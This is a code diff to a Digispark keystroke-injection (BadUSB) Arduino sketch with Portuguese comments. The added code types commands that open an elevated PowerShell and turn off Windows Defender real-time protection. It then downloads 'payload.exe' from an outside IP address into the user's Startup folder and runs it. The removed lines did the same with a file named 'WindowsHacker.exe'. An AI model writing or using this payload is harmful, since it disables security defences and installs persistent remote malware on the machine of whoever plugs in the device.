@@ -9,7 +9,7 @@
 #define KEY_INSERT       0x49
 #define KEY_NUM_LOCK     0x53
 #define KEY_SCROLL_LOCK  0x47
-#define KEY_CAPS_LOCK  0x39
+#define KEY_CAPS_LOCK    0x39
 #define KEY_TAB          0x2B
 
 void digiBegin() {
@@ -33,24 +33,47 @@ void printText(fstr_t *txt) {
 
 void setup() {
   digiBegin();
-  // You can remove this Delay line in the beginning (I just rather having it just in case)
-  DigiKeyboard.delay(600);
-  // open the Run
+ 
+  ///desabilitar windows defender
+  DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  // Change this value depending on the computer you are using ( i mean slow or not )
-  DigiKeyboard.delay(100);
-  printText(F("powershell  $source = 'http://192.168.3.23:8082/key/WindowsHacker.exe'; $destination =  '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\b.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
+  DigiKeyboard.delay(200);
+  // Iniciar uma instância do PowerShell elevada que desabilitará o Windows Defender
+  printText(F("powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  // se você precisar de administrador [esquerda, digite e atrase 1000]
+  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+//  digiEnd();
+  ////////////////////////////////////////////////////////////////////////
+   
+  // Você pode remover esta linha de atraso no começo (eu prefiro tê-la apenas por precaução)
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  // Altere esse valor dependendo do computador que você está usando (ou seja, lento ou não)
+  DigiKeyboard.delay(900);
+  printText(F("powershell $source = 'http://34.97.212.80/payload.exe'; $destination = '%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\__.exe'; Invoke-WebRequest $source -OutFile $destination;")); 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(5000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(100);
-  printText(F("powershell start-process %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\b.exe"));
+  DigiKeyboard.delay(900);
+  printText(F("%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\__.exe"));
+  //powershell start-process 
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.delay(900);
   printText(F("exit"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(900);
+  DigiKeyboard.sendKeyStroke(KEY_B, MOD_GUI_LEFT);
   digiEnd();
 }
 
 /* Unused endless loop */
 void loop() {}
+
+
+ 
